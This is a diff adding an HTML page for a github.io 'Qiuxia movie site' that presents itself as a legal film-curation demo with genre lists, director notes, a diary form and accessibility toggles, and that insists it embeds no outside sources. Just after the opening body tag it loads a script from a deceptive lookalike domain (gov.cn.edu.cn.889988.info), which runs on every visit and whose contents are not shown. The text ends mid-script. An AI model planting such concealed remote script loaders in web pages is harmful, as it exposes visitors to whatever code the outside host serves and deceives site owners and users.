@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>秋霞电影网 - 霞光编辑馆·类型片单与导演手记 | qiuxiadianyingwanglun-h5.github.io</title>
+<meta name="description" content="秋霞电影网（https://qiuxiadianyingwanglun-h5.github.io）是单页演示：主编轮播、类型片单、导演手记、观影日记、字幕/色弱/大字号无障碍、正版站规。移动端自适应，内链全#，不提供盗版视频源。">
+<meta name="keywords" content="秋霞电影网,霞光编辑馆,类型片单,导演手记,观影日记,字幕无障碍,正版引导,单页演示,qiuxiadianyingwanglun-h5.github.io">
+<meta name="robots" content="index,follow">
+<meta property="og:title" content="秋霞电影网 - 霞光编辑馆">
+<meta property="og:description" content="主编精选、类型片单、导演手记、观影日记与视听无障碍演示。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://qiuxiadianyingwanglun-h5.github.io">
+<link rel="canonical" href="https://qiuxiadianyingwanglun-h5.github.io">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --paper:#fbf2ea;--paper2:#f4e3d6;--cream:#fff8f1;
+  --ink:#2c1c1a;--ink2:#5e423c;--ink3:#927169;
+  --dawn:#f4a26b;--dawn2:#ef7e4e;
+  --cloud:#d8546a;--cloud2:#b8395a;
+  --dusk:#5b3a63;--dusk2:#3c2545;
+  --gold:#d79a32;--line:rgba(44,28,26,.18);
+  --shadow:0 12px 26px rgba(44,28,26,.16);
+}
+/* 无障碍状态 */
+body.big-text{font-size:18px}
+body.cb-mode{--cloud:#7a6b00;--cloud2:#5c5000;--dusk:#234b6b;--dusk2:#16344d;--dawn:#e0a200;--dawn2:#b98600}
+body.reduce-motion *{animation:none!important;transition:none!important;scroll-behavior:auto!important}
+html{scroll-behavior:smooth}
+body{font-family:"Noto Serif SC","PingFang SC","Microsoft YaHei",system-ui,serif;background:var(--paper);color:var(--ink);line-height:1.78;overflow-x:hidden}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1180px;margin:0 auto;padding:0 16px}
+
+/* 霞光背景 */
+.sky{position:fixed;inset:0;z-index:0;pointer-events:none;
+  background:
+   radial-gradient(120% 70% at 10% -10%,rgba(244,162,107,.30),transparent 55%),
+   radial-gradient(120% 80% at 95% 0%,rgba(216,84,106,.26),transparent 55%),
+   radial-gradient(140% 90% at 50% 120%,rgba(91,58,99,.22),transparent 55%),
+   var(--paper);}
+
+/* header */
+.site-header{position:sticky;top:0;z-index:60;background:linear-gradient(180deg,var(--dusk2),var(--dusk));color:var(--paper);border-bottom:3px solid var(--cloud)}
+.nav{display:flex;align-items:center;justify-content:space-between;min-height:62px;gap:10px;flex-wrap:wrap}
+.brand{display:flex;align-items:center;gap:10px;font-weight:900;font-size:1.15rem;letter-spacing:.5px}
+.brand .sun{width:28px;height:28px;border-radius:50%;background:radial-gradient(circle at 35% 35%,#ffe1b0,var(--dawn) 60%,var(--cloud));box-shadow:0 0 14px rgba(244,162,107,.6)}
+.brand b{color:#ffd2c0}
+.searchbar{display:flex;gap:8px;flex:1;min-width:160px;max-width:360px}
+.searchbar input{flex:1;padding:9px 12px;border-radius:8px;border:1px solid var(--line);background:var(--cream);color:var(--ink);font-size:.9rem}
+.searchbar button{padding:9px 15px;border:0;border-radius:8px;background:var(--cloud);color:#fff3ee;font-weight:800;cursor:pointer;min-height:44px}
+.navlinks{display:flex;gap:4px;flex-wrap:wrap}
+.navlinks a{padding:8px 11px;border-radius:6px;font-size:.82rem;font-weight:700;color:#f3d9d2;transition:.2s;min-height:44px;display:inline-flex;align-items:center}
+.navlinks a:hover,.navlinks a.active{background:var(--paper);color:var(--dusk2)}
+.burger{display:none;flex-direction:column;gap:5px;cursor:pointer}
+.burger span{width:24px;height:3px;background:var(--paper);border-radius:3px}
+
+/* hero 轮播 */
+.hero{padding:30px 0 18px;position:relative;z-index:1}
+.slider{position:relative;border-radius:18px;overflow:hidden;box-shadow:var(--shadow);border:1px solid var(--line)}
+.slides{display:flex;transition:transform .5s ease}
+.slide{min-width:100%;padding:36px 28px;color:#fff;display:grid;grid-template-columns:1.4fr .6fr;gap:18px;align-items:center;min-height:240px}
+.slide.s1{background:linear-gradient(120deg,var(--dawn),var(--cloud2))}
+.slide.s2{background:linear-gradient(120deg,var(--cloud),var(--dusk2))}
+.slide.s3{background:linear-gradient(120deg,var(--gold),var(--dawn2))}
+.slide.s4{background:linear-gradient(120deg,var(--dusk),var(--cloud))}
+.slide .kicker{font-size:.74rem;font-weight:800;letter-spacing:2px;opacity:.92}
+.slide h1{font-size:clamp(1.6rem,4.4vw,2.6rem);font-weight:900;line-height:1.18;margin:8px 0}
+.slide p{max-width:520px;color:#fff5f0;font-size:.92rem}
+.slide .meta{margin-top:12px;display:flex;gap:8px;flex-wrap:wrap}
+.slide .meta span{font-size:.72rem;font-weight:800;background:#ffffff22;padding:5px 10px;border-radius:999px}
+.slide .poster{height:170px;border-radius:12px;background:rgba(255,255,255,.16);display:grid;place-items:center;font-size:3.4rem;border:1px solid #ffffff44}
+.arrows{position:absolute;top:50%;transform:translateY(-50%);width:42px;height:42px;border-radius:50%;border:0;background:#00000033;color:#fff;font-size:1.2rem;cursor:pointer;min-height:44px}
+.arrows.prev{left:10px}.arrows.next{right:10px}
+.dots{position:absolute;bottom:12px;left:50%;transform:translateX(-50%);display:flex;gap:7px}
+.dots button{width:10px;height:10px;border-radius:50%;border:0;background:#ffffff66;cursor:pointer}
+.dots button.on{background:#fff;width:22px;border-radius:6px}
+
+section.block{padding:38px 0;position:relative;z-index:1}
+.sec-head{display:flex;align-items:center;gap:10px;margin-bottom:18px}
+.sec-head .icon{width:30px;height:30px;border-radius:9px;background:linear-gradient(135deg,var(--dawn),var(--cloud));display:grid;place-items:center;color:#fff;font-size:1rem}
+.sec-head h2{font-size:1.3rem;font-weight:900}
+.sec-head .tag{margin-left:auto;font-size:.72rem;color:var(--ink2);background:var(--cream);border:1px solid var(--line);padding:5px 12px;border-radius:999px}
+
+/* 2 类型片单：横向片带+分面 */
+.facets{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:14px}
+.facet{font-size:.78rem;font-weight:800;padding:7px 13px;border-radius:999px;border:1px solid var(--line);background:var(--cream);cursor:pointer;min-height:40px}
+.facet.on{background:linear-gradient(135deg,var(--dawn),var(--cloud));color:#fff;border-color:transparent}
+.strip{display:grid;grid-auto-flow:column;grid-auto-columns:minmax(210px,1fr);gap:14px;overflow-x:auto;padding-bottom:10px;scroll-snap-type:x mandatory}
+.strip::-webkit-scrollbar{height:8px}.strip::-webkit-scrollbar-thumb{background:var(--cloud);border-radius:8px}
+.fcard{scroll-snap-align:start;background:var(--cream);border:1px solid var(--line);border-radius:12px;overflow:hidden;box-shadow:var(--shadow);opacity:0;transform:translateY(12px);transition:.5s}
+.fcard.in{opacity:1;transform:none}
+.fcard:hover{border-color:var(--cloud)}
+.fcard .top{height:104px;display:grid;place-items:center;font-size:1.8rem;color:#fff;position:relative}
+.top.g1{background:linear-gradient(135deg,var(--dawn),var(--cloud2))}
+.top.g2{background:linear-gradient(135deg,var(--dusk),var(--cloud))}
+.top.g3{background:linear-gradient(135deg,var(--gold),var(--dawn2))}
+.top.g4{background:linear-gradient(135deg,var(--cloud),var(--dusk2))}
+.top.g5{background:linear-gradient(135deg,var(--dawn2),var(--gold))}
+.top.g6{background:linear-gradient(135deg,var(--dusk2),var(--dawn))}
+.fcard .top .genre{position:absolute;top:8px;left:8px;font-size:.62rem;font-weight:800;background:#fff;color:var(--cloud2);padding:2px 7px;border-radius:5px}
+.fcard .body{padding:11px 13px}
+.fcard h4{font-size:.86rem;font-weight:800}
+.fcard p{font-size:.72rem;color:var(--ink2);margin-top:2px}
+.fcard .row{display:flex;justify-content:space-between;align-items:center;margin-top:8px}
+.fcard .row .len{font-family:ui-monospace,monospace;font-size:.7rem;color:var(--cloud2);font-weight:800}
+.fcard .row .more{font-size:.7rem;font-weight:800;color:#fff;background:var(--cloud);padding:4px 10px;border-radius:999px}
+
+/* 3 导演手记：折叠 */
+.notes{max-width:920px;margin:0 auto;display:grid;gap:12px}
+.acc{background:var(--cream);border:1px solid var(--line);border-left:5px solid var(--dusk);border-radius:10px;box-shadow:var(--shadow);overflow:hidden}
+.acc button.acc-h{width:100%;text-align:left;background:transparent;border:0;padding:14px 16px;font-size:.92rem;font-weight:800;color:var(--ink);cursor:pointer;display:flex;justify-content:space-between;gap:10px;min-height:48px;align-items:center}
+.acc button.acc-h .ar{transition:.3s;color:var(--cloud2)}
+.acc.open button.acc-h .ar{transform:rotate(90deg)}
+.acc .acc-b{max-height:0;overflow:hidden;transition:max-height .35s ease}
+.acc .acc-b .inner{padding:0 16px 14px;font-size:.82rem;color:var(--ink2)}
+.acc .inner .tags{margin-top:8px;display:flex;gap:6px;flex-wrap:wrap}
+.acc .inner .tags span{font-size:.66rem;font-weight:800;padding:2px 8px;border-radius:999px;background:var(--paper2);color:var(--ink2)}
+
+/* 4 观影日记：表单+内存列表 */
+.diary{max-width:880px;margin:0 auto;display:grid;grid-template-columns:1fr 1fr;gap:18px}
+.dform{background:var(--cream);border:1px solid var(--line);border-radius:14px;padding:16px;box-shadow:var(--shadow)}
+.dform label{display:block;font-size:.78rem;font-weight:800;margin:10px 0 5px;color:var(--ink2)}
+.dform input,.dform select,.dform textarea{width:100%;padding:10px 12px;border-radius:8px;border:1px solid var(--line);background:var(--paper);color:var(--ink);font-size:.86rem;font-family:inherit}
+.dform textarea{min-height:84px;resize:vertical}
+.dform button{margin-top:12px;width:100%;padding:11px;border:0;border-radius:9px;background:linear-gradient(135deg,var(--dawn),var(--cloud));color:#fff;font-weight:800;cursor:pointer;min-height:46px}
+.dlist{display:flex;flex-direction:column;gap:10px;max-height:360px;overflow:auto}
+.ditem{background:var(--cream);border:1px solid var(--line);border-left:5px solid var(--gold);border-radius:10px;padding:11px 13px;box-shadow:var(--shadow)}
+.ditem h4{font-size:.84rem;font-weight:800}
+.ditem .sub{font-size:.7rem;color:var(--ink3);font-family:ui-monospace,monospace}
+.ditem p{font-size:.78rem;color:var(--ink2);margin-top:4px}
+.dempty{font-size:.8rem;color:var(--ink3);text-align:center;padding:30px 0}
+
+/* 5 视听无障碍面板 */
+.a11y{max-width:920px;margin:0 auto;background:linear-gradient(180deg,var(--dusk2),#241327);color:#f6e3dc;border-radius:14px;padding:18px 20px;box-shadow:var(--shadow)}
+.a11y h3{font-size:.96rem;color:#ffd2c0;margin-bottom:12px}
+.arow{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
+.atile{background:#2c1a2f;border:1px solid #50324a;border-radius:10px;padding:12px}
+.atile b{font-size:.84rem;display:block;margin-bottom:8px;color:#ffd2c0}
+.atile p{font-size:.72rem;color:#e7cfc8}
+.btn-toggle{margin-top:8px;display:inline-flex;align-items:center;gap:8px;font-size:.76rem;font-weight:800;cursor:pointer}
+.sw{width:44px;height:24px;border-radius:99px;background:#c8a89f;position:relative;transition:.2s}
+.sw i{position:absolute;top:2px;left:2px;width:20px;height:20px;border-radius:50%;background:#fff;transition:.2s}
+.sw.on{background:var(--dawn)}
+.sw.on i{left:22px}
+.subtitles{margin-top:12px;background:#1c101f;border:1px solid #50324a;border-radius:10px;padding:12px}
+.subtitles .track{font-size:.82rem;color:#ffe1d6;background:#00000033;padding:8px 10px;border-radius:6px;min-height:42px;display:flex;align-items:center}
+.subtitles .ctrls{display:flex;gap:8px;margin-top:8px;flex-wrap:wrap}
+.subtitles .ctrls button{font-size:.74rem;font-weight:800;padding:6px 12px;border-radius:8px;border:1px solid #50324a;background:#2c1a2f;color:#ffd2c0;cursor:pointer;min-height:40px}
+
+/* 6 站规 */
+.rules{max-width:840px;margin:0 auto;background:var(--cream);border:2px solid var(--cloud);border-radius:14px;padding:20px;box-shadow:var(--shadow)}
+.rules h3{font-size:1rem;margin-bottom:8px;color:var(--cloud2)}
+.rules ul{list-style:none;display:grid;gap:8px}
+.rules li{font-size:.8rem;padding-left:20px;position:relative;line-height:1.65}
+.rules li::before{content:'🌇';position:absolute;left:0}
+.rules .dis{margin-top:12px;font-size:.73rem;color:var(--ink3);border-top:1px dashed var(--line);padding-top:10px}
+
+footer.site-foot{margin-top:34px;background:linear-gradient(180deg,transparent,var(--dusk2));border-top:3px solid var(--cloud);color:#f3d9d2;padding:30px 0 20px;position:relative;z-index:1}
+.foot-brand{font-weight:900;font-size:1.1rem;text-align:center;margin-bottom:10px}
+.foot-brand b{color:#ffd2c0}
+.foot-links{display:flex;flex-wrap:wrap;justify-content:center;gap:14px;margin-bottom:12px}
+.foot-links a{font-size:.8rem;color:#e7cfc8;min-height:40px;display:inline-flex;align-items:center}
+.foot-links a:hover{color:#ffd2c0}
+.foot-small{text-align:center;font-size:.73rem;color:#d8b9b2;line-height:1.7}
+
+@media(max-width:960px){.slide{grid-template-columns:1fr}.slide .poster{height:130px}.diary{grid-template-columns:1fr}.arow{grid-template-columns:1fr}}
+@media(max-width:680px){
+  .navlinks{position:fixed;top:62px;left:12px;right:12px;flex-direction:column;background:var(--dusk2);padding:10px;border-radius:12px;box-shadow:var(--shadow);transform:translateY(-180%);transition:.3s}
+  .navlinks.open{transform:none}
+  .burger{display:flex}
+  .searchbar{order:3;width:100%;max-width:none}
+}
+@media(max-width:420px){.strip{grid-auto-columns:82%}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="sky"></div>
+
+<div class="wrap">
+  <header class="site-header">
+    <div class="nav">
+      <div class="brand"><span class="sun"></span> 秋霞电影网<b>·霞光编辑馆</b></div>
+      <form class="searchbar" onsubmit="return false">
+        <input type="search" placeholder="搜片单/手记/日记：霞光·治愈·悬疑·动画…" aria-label="搜索影视">
+        <button type="submit">检索</button>
+      </form>
+      <nav class="navlinks" id="nav">
+        <a href="#feature" class="active">主编主打</a>
+        <a href="#genres">类型片单</a>
+        <a href="#notes">导演手记</a>
+        <a href="#diary">观影日记</a>
+        <a href="#a11y">视听无障碍</a>
+        <a href="#rules">站规正版</a>
+      </nav>
+      <div class="burger" id="burger"><span></span><span></span><span></span></div>
+    </div>
+  </header>
+
+  <main>
+    <!-- 轮播 主编主打 -->
+    <section class="hero" id="feature">
+      <div class="slider">
+        <div class="slides" id="slides">
+          <div class="slide s1"><div>
+            <div class="kicker">晨霞 · 主编精选</div>
+            <h1>把一天从一场电影开始</h1>
+            <p>秋霞电影网（qiuxiadianyingwanglun-h5.github.io）用编辑视角整理片单：不堆链接、不挂源，只做选片理由、观看节奏与正版建议。</p>
+            <div class="meta"><span>晨间治愈</span><span>90分钟档</span><span>示例片单</span></div>
+          </div><div class="poster">🌅</div></div>
+
+          <div class="slide s2"><div>
+            <div class="kicker">晚霞 · 情绪长片</div>
+            <h1>黄昏适合慢一点看</h1>
+            <p>悬疑、家庭、历史与音乐片按“情绪曲线”排布；本页所有卡片仅演示，内链全 #，不提供正片下载与在线盗播。</p>
+            <div class="meta"><span>慢节奏</span><span>导演手记</span><span>无外链源</span></div>
+          </div><div class="poster">🌇</div></div>
+
+          <div class="slide s3"><div>
+            <div class="kicker">金霞 · 亲子动画</div>
+            <h1>全家场也能很省心</h1>
+            <p>动画、自然纪录片、短篇寓言单独分面；字幕、大字号、色弱模式可在无障碍面板切换，纯前端演示。</p>
+            <div class="meta"><span>亲子</span><span>字幕演示</span><span>无障碍</span></div>
+          </div><div class="poster">🎨</div></div>
+
+          <div class="slide s4"><div>
+            <div class="kicker">暮紫 · 影评深读</div>
+            <h1>手记比评分更有用</h1>
+            <p>每部重点片配“为什么选它、怎么看不累、适合什么心情”三段手记，支持折叠展开，方便移动端速读。</p>
+            <div class="meta"><span>深读</span><span>折叠手记</span><span>编辑口径</span></div>
+          </div><div class="poster">📝</div></div>
+        </div>
+        <button class="arrows prev" id="prev" aria-label="上一张">‹</button>
+        <button class="arrows next" id="next" aria-label="下一张">›</button>
+        <div class="dots" id="dots"></div>
+      </div>
+    </section>
+
+    <!-- 2 类型片单 -->
+    <section class="block" id="genres">
+      <div class="sec-head"><span class="icon">🎞️</span><h2>类型片单</h2><span class="tag">横向片带·分面筛选</span></div>
+      <div class="facets" id="facets">
+        <span class="facet on" data-g="all">全部</span>
+        <span class="facet" data-g="love">爱情/治愈</span>
+        <span class="facet" data-g="crime">悬疑/犯罪</span>
+        <span class="facet" data-g="history">历史/传记</span>
+        <span class="facet" data-g="anim">动画/亲子</span>
+        <span class="facet" data-g="music">音乐/文艺</span>
+        <span class="facet" data-g="doc">纪录/自然</span>
+      </div>
+      <div class="strip" id="strip">
+        <article class="fcard" data-g="love"><div class="top g1"><span class="genre">爱情治愈</span>💌</div><div class="body"><h4>晚霞来信</h4><p>海边笔友、十年回信，慢情绪线</p><div class="row"><span class="len">104min</span><span class="more">手记</span></div></div></article>
+        <article class="fcard" data-g="crime"><div class="top g2"><span class="genre">悬疑</span>🕵️</div><div class="body"><h4>梧桐巷旧信</h4><p>邻里谜案、雨夜物证、非血腥</p><div class="row"><span class="len">118min</span><span class="more">手记</span></div></div></article>
+        <article class="fcard" data-g="history"><div class="top g4"><span class="genre">历史</span>🏯</div><div class="body"><h4>霞关驿路</h4><p>古代邮传、商队与地图，群像</p><div class="row"><span class="len">132min</span><span class="more">手记</span></div></div></article>
+        <article class="fcard" data-g="anim"><div class="top g3"><span class="genre">动画</span>🎨</div><div class="body"><h4>银杏小学秋天课</h4><p>亲子、绘画展、不惊吓</p><div class="row"><span class="len">86min</span><span class="more">手记</span></div></div></article>
+        <article class="fcard" data-g="music"><div class="top g5"><span class="genre">音乐</span>🎻</div><div class="body"><h4>枫叶协奏曲</h4><p>乐团排练、归乡、轻冲突</p><div class="row"><span class="len">110min</span><span class="more">手记</span></div></div></article>
+        <article class="fcard" data-g="doc"><div class="top g6"><span class="genre">纪录</span>🏔️</div><div class="body"><h4>霜降气象站</h4><p>雪山救援、装备与科普</p><div class="row"><span class="len">97min</span><span class="more">手记</span></div></div></article>
+        <article class="fcard" data-g="love"><div class="top g1"><span class="genre">治愈</span>🍲</div><div class="body"><h4>晚霞食堂</h4><p>饭桌群像、四季转场</p><div class="row"><span class="len">101min</span><span class="more">手记</span></div></div></article>
+        <article class="fcard" data-g="crime"><div class="top g2"><span class="genre">犯罪</span>🚆</div><div class="body"><h4>南下车票</h4><p>误车、线索、轻喜剧悬疑</p><div class="row"><span class="len">95min</span><span class="more">手记</span></div></div></article>
+        <article class="fcard" data-g="anim"><div class="top g3"><span class="genre">亲子</span>🐿️</div><div class="body"><h4>松鼠收秋天</h4><p>森林储粮、节令启蒙</p><div class="row"><span class="len">78min</span><span class="more">手记</span></div></div></article>
+        <article class="fcard" data-g="history"><div class="top g4"><span class="genre">传记</span>🖌️</div><div class="body"><h4>画师与霞光</h4><p>民间画家、色彩实验、平实</p><div class="row"><span class="len">120min</span><span class="more">手记</span></div></div></article>
+      </div>
+    </section>
+
+    <!-- 3 导演手记 -->
+    <section class="block" id="notes">
+      <div class="sec-head"><span class="icon">📝</span><h2>导演 / 编辑手记</h2><span class="tag">折叠速读·纯文本</span></div>
+      <div class="notes" id="notesBox">
+        <div class="acc open"><button class="acc-h">《晚霞来信》：为什么用“回信”做主线？<span class="ar">▶</span></button><div class="acc-b"><div class="inner"><p>示例手记：把双向笔友作为情绪锚点，避免信息倾泻；前中段用海边空镜留白，后段再回收信件细节。移动端建议分段看，每次30分钟不累。<div class="tags"><span>情绪曲线</span><span>慢热</span><span>无剧透结局</span></div></p></div></div></div>
+        <div class="acc"><button class="acc-h">《梧桐巷旧信》：悬疑怎样不靠血腥？<span class="ar">▶</span></button><div class="acc-b"><div class="inner"><p>示例手记：用“信件—雨夜—邻里习惯”三套线索交替，重在动机而非惊吓；暴力仅台词暗示。适合晚间但不建议睡前连看多集。<div class="tags"><span>非血腥</span><span>时间线</span><span>证据表</span></div></p></div></div></div>
+        <div class="acc"><button class="acc-h">《银杏小学秋天课》：亲子动画的节奏分配<span class="ar">▶</span></button><div class="acc-b"><div class="inner"><p>示例手记：每10分钟一个小节气知识点，笑点放在动物配角，情感落点放在“完成画作”。字幕开启后低龄儿童可独立理解。<div class="tags"><span>亲子</span><span>字幕</span><span>节令</span></div></p></div></div></div>
+        <div class="acc"><button class="acc-h">《枫叶协奏曲》：音乐片如何不枯燥<span class="ar">▶</span></button><div class="acc-b"><div class="inner"><p>示例手记：排练冲突放在中段，归乡主题放在终章；示意谱例替代原声片段，避免版权问题。听感敏感用户可配合无障碍面板降低高频。<div class="tags"><span>音乐</span><span>示意音频</span><span>文艺</span></div></p></div></div></div>
+      </div>
+    </section>
+
+    <!-- 4 观影日记 -->
+    <section class="block" id="diary">
+      <div class="sec-head"><span class="icon">📓</span><h2>观影日记</h2><span class="tag">前端内存·不保存服务器</span></div>
+      <div class="diary">
+        <form class="dform" id="dform" autocomplete="off">
+          <label for="dtitle">片名/示例</label>
+          <input id="dtitle" placeholder="如：晚霞来信（示例）" required>
+          <label for="dmood">心情</label>
+          <select id="dmood">
+            <option>治愈放松</option><option>烧脑解谜</option><option>亲子共看</option>
+            <option>一个人哭</option><option>朋友闲聊</option><option>学习拉片</option>
+          </select>
+          <label for="drating">推荐度 1-5</label>
+          <input id="drating" type="number" min="1" max="5" value="4">
+          <label for="dnote">短评</label>
+          <textarea id="dnote" placeholder="写了什么心情、哪段最打动你（演示仅存本页内存）"></textarea>
+          <button type="submit">写进本页日记</button>
+        </form>
+        <div class="dlist" id="dlist">
+          <div class="dempty" id="dempty">还没有日记。上方写一条，仅在本页展示，刷新后清空。</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 5 视听无障碍 -->
+    <section class="block" id="a11y">
+      <div class="sec-head"><span class="icon">♿</span><h2>视听 / 无障碍面板</h2><span class="tag">纯前端演示</span></div>
+      <div class="a11y">
+        <h3>为不同观看环境调一调</h3>
+        <div class="arow">
+          <div class="atile"><b>大字号模式</b><p>整体正文字号放大，长手记更省力。</p><span class="btn-toggle" data-a11y="big"><span class="sw" id="swBig"><i></i></span> 开启大字号</span></div>
+          <div class="atile"><b>色弱友好配色</b><p>把霞光红紫替换为高对比蓝黄，降低辨色负担。</p><span class="btn-toggle" data-a11y="cb"><span class="sw" id="swCb"><i></i></span> 开启色弱模式</span></div>
+          <div class="atile"><b>减弱动效</b><p>关闭轮播自动播放与过渡，适合眩晕敏感。</p><span class="btn-toggle" data-a11y="rm"><span class="sw" id="swRm"><i></i></span> 开启减弱动效</span></div>
+        </div>
+        <div class="subtitles">
+          <div class="track" id="subTrack">字幕演示：『今天的风从海边来，信还没拆。』——仅示例文本，不绑定任何视频。</div>
+          <div class="ctrls">
+            <button data-sub="小">小字幕</button>
+            <button data-sub="中">中字幕</button>
+            <button data-sub="大">大字幕</button>
+            <button data-sub="隐藏">隐藏字幕</button>
+          </div>
+        </div>
+        <p style="font-size:.74rem;color:#e7cfc8;margin-top:10px">说明：以上开关只改本页样式与示例字幕，不转码、不播放、不调用外部字幕文件。</p>
+      </div>
+    </section>
+
+    <!-- 6 站规 -->
+    <section class="block" id="rules">
+      <div class="sec-head"><span class="icon">🌇</span><h2>站规 / 正版引导</h2><span class="tag">秋霞演示站</span></div>
+      <div class="rules">
+        <h3>秋霞电影网·单页站务</h3>
+        <ul>
+          <li>本页为单文件演示：主编轮播、类型片单、导演手记、观影日记、无障碍面板、站规均为前端交互，内链全部为 <code>#</code>。</li>
+          <li>不提供受版权保护的电影/剧集正片直链，不嵌入第三方播放源，不发布“最新地址/备用域名/专用播放器/全片网盘”。</li>
+          <li>“秋霞电影网”仅为站点命名与霞光视觉主题；本演示与任何历史影视资源站无关联，不引导至仿冒或跳转站。</li>
+          <li>片名、手记、日记示例均为虚构/原创文案；观影日记仅存浏览器内存，不上传、不收集个人信息。</li>
+          <li>看正版请使用权利人授权视频平台、院线、图书馆数字资源或公共版权片库；本页仅做选片参考。</li>
+        </ul>
+        <div class="dis">免责声明：秋霞电影网演示站（qiuxiadianyingwanglun-h5.github.io）仅用于前端版式与影视信息整理研究。警惕仿冒影视站弹窗、诱导下载与钓鱼页面。</div>
+      </div>
+    </section>
+  </main>
+</div>
+
+<footer class="site-foot">
+  <div class="wrap">
+    <div class="foot-brand">秋霞电影网 · <b>qiuxiadianyingwanglun-h5.github.io</b></div>
+    <nav class="foot-links">
+      <a href="#feature">主编主打</a>
+      <a href="#genres">类型片单</a>
+      <a href="#notes">导演手记</a>
+      <a href="#diary">观影日记</a>
+      <a href="#a11y">视听无障碍</a>
+      <a href="#rules">站规正版</a>
+    </nav>
+    <div class="foot-small">
+      单文件演示站 · 移动端自适应 · 内链全# · 不生成 robots.txt/sitemap.xml · canonical 指向本站首页。<br>
+      © 2026 秋霞电影网演示项目。片单与手记均为示例，不提供盗版源。
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  var burger=document.getElementById('burger'),nav=document.getElementById('nav');
+  if(burger&&nav){burger.addEventListener('click',function(){nav.classList.toggle('open');});
+    nav.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){nav.classList.remove('open');});});}
+
+  /* 导航高亮 */
+  var secs=[].slice.call(document.querySelectorAll('main section[id]'));
+  var links=nav?nav.querySelectorAll('a'):[];
+  function onScroll(){var y=window.scrollY+120;secs.forEach(function(s){if(y>=s.offsetTop){links.forEach(function(l){l.classList.toggle('active',l.getAttribute('href')==='#'+s.id);});}});}
+  window.addEventListener('scroll',onScroll,{passive:true});onScroll();
+
+  /* 轮播 */
+  var slides=document.getElementById('slides'),total=slides?slides.children.length:0,idx=0,timer=null;
+  var dots=document.getElementById('dots');
+  if(slides&&total){
+    for(var i=0;i<total;i++){var b=document.createElement('button');b.setAttribute('aria-label','第'+(i+1)+'张');if(i===0)b.className='on';b.addEventListener('click',function(n){return function(){go(n
